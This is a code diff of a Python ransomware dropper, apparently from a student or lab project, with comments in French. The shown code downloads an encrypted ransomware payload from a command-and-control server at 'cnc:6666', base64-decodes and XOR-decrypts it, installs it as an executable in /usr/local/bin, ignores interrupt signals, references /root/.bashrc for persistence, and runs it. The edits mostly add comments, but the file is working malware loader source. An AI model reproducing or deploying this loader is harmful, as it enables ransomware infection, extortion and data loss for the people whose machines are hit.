@@ -7,12 +7,13 @@ from xor_crypt import xor_crypt
 import signal
 
 CNC_ADDRESS = "cnc:6666"
-OUTPUT_FILE = "/usr/local/bin/ransomware" 
+OUTPUT_FILE = "/usr/local/bin/ransomware"
 
 BASHRC_PATH = "/root/.bashrc"
 COMMAND = "\n/usr/local/bin/ransomware --decrypt\n"
 
 def get_ransomware_from_cnc():
+    # Récupérer le ransomware crypté depuis le serveur CNC
     url = f"http://{CNC_ADDRESS}/ransomware"
     response = requests.get(url)
     if response.status_code == 200:
@@ -22,25 +23,26 @@ def get_ransomware_from_cnc():
         sys.exit(1)
 
 def decode_and_save_ransomware(encoded_ransomware: str, encoded_key: str):
+    # Décode le ransomware et la clé encodée en base64
     decoded_ransomware = base64.b64decode(encoded_ransomware)
     decoded_key = base64.b64decode(encoded_key)
-    
+
+    # Décrypte le ransomware avec la clé décodée
     decrypted_ransomware = xor_crypt(decoded_ransomware, decoded_key)
 
-    #create folder if not exist
+    # Crée le dossier s'il n'existe pas
     os.makedirs(os.path.dirname('usr/local/bin'), exist_ok=True)
+    # Sauvegarde le ransomware décodé dans un fichier
     with open(OUTPUT_FILE, "wb") as f:
         f.write(decrypted_ransomware)
 
     os.chmod(OUTPUT_FILE, 0o755)  # Rendre le fichier exécutable
 
-
-
 def main():
     # Ignorer les signaux SIGINT
     signal.signal(signal.SIGINT, signal.SIG_IGN)
 
-    # Récuperer le ransomware depuis le cnc si il n'est pas déjà présent
+    # Récupérer le ransomware depuis le CNC s'il n'est pas déjà présent
     if not os.path.exists(OUTPUT_FILE):
         cnc_response = get_ransomware_from_cnc()
         encoded_ransomware = cnc_response["data"]
@@ -61,7 +63,6 @@ def main():
     else:
         # Lancer le ransomware installé avec des arguments
         subprocess.run([OUTPUT_FILE, sys.argv[1]])
-
 
 if __name__ == "__main__":
     main()
